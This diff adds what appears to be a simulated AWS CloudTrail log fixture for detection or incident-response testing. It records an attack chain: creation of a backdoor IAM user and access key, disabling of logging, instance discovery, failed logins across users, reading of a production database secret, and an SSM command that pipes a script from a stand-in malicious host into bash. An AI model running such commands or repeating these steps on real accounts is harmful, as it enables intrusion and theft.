@@ -1,0 +1,147 @@
+{
+  "Records": [
+    {
+      "eventVersion": "1.08",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "CreateUser",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "198.51.100.42",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/compromised-admin",
+        "userName": "compromised-admin"
+      },
+      "requestParameters": {
+        "userName": "backdoor-user"
+      },
+      "responseElements": {
+        "user": {
+          "userName": "backdoor-user",
+          "userId": "AIDAEXAMPLE12345"
+        }
+      },
+      "eventTime": "2025-01-15T08:00:00Z"
+    },
+    {
+      "eventVersion": "1.08",
+      "eventSource": "iam.amazonaws.com",
+      "eventName": "CreateAccessKey",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "198.51.100.42",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/compromised-admin",
+        "userName": "compromised-admin"
+      },
+      "requestParameters": {
+        "userName": "backdoor-user"
+      },
+      "responseElements": {
+        "accessKey": {
+          "accessKeyId": "AKIAEXAMPLE12345",
+          "status": "Active"
+        }
+      },
+      "eventTime": "2025-01-15T08:01:00Z"
+    },
+    {
+      "eventVersion": "1.08",
+      "eventSource": "cloudtrail.amazonaws.com",
+      "eventName": "StopLogging",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "198.51.100.42",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/backdoor-user",
+        "userName": "backdoor-user"
+      },
+      "requestParameters": {
+        "name": "management-trail"
+      },
+      "eventTime": "2025-01-15T08:05:00Z"
+    },
+    {
+      "eventVersion": "1.08",
+      "eventSource": "ec2.amazonaws.com",
+      "eventName": "DescribeInstances",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "198.51.100.42",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/backdoor-user",
+        "userName": "backdoor-user"
+      },
+      "eventTime": "2025-01-15T08:10:00Z"
+    },
+    {
+      "eventVersion": "1.08",
+      "eventSource": "ssm.amazonaws.com",
+      "eventName": "SendCommand",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "198.51.100.42",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/backdoor-user",
+        "userName": "backdoor-user"
+      },
+      "requestParameters": {
+        "instanceIds": ["i-0abcdef1234567890"],
+        "documentName": "AWS-RunShellScript",
+        "parameters": {
+          "commands": ["curl http://malicious.example.com/payload.sh | bash"]
+        }
+      },
+      "eventTime": "2025-01-15T08:15:00Z"
+    },
+    {
+      "eventVersion": "1.08",
+      "eventSource": "signin.amazonaws.com",
+      "eventName": "ConsoleLogin",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.99",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/finance-user",
+        "userName": "finance-user"
+      },
+      "responseElements": {
+        "ConsoleLogin": "Failure"
+      },
+      "errorMessage": "Failed authentication",
+      "eventTime": "2025-01-15T09:00:00Z"
+    },
+    {
+      "eventVersion": "1.08",
+      "eventSource": "signin.amazonaws.com",
+      "eventName": "ConsoleLogin",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "203.0.113.99",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/hr-user",
+        "userName": "hr-user"
+      },
+      "responseElements": {
+        "ConsoleLogin": "Failure"
+      },
+      "errorMessage": "Failed authentication",
+      "eventTime": "2025-01-15T09:01:00Z"
+    },
+    {
+      "eventVersion": "1.08",
+      "eventSource": "secretsmanager.amazonaws.com",
+      "eventName": "GetSecretValue",
+      "awsRegion": "us-east-1",
+      "sourceIPAddress": "198.51.100.42",
+      "userIdentity": {
+        "type": "IAMUser",
+        "arn": "arn:aws:iam::123456789012:user/backdoor-user",
+        "userName": "backdoor-user"
+      },
+      "requestParameters": {
+        "secretId": "prod/database/credentials"
+      },
+      "eventTime": "2025-01-15T08:20:00Z"
+    }
+  ]
+}
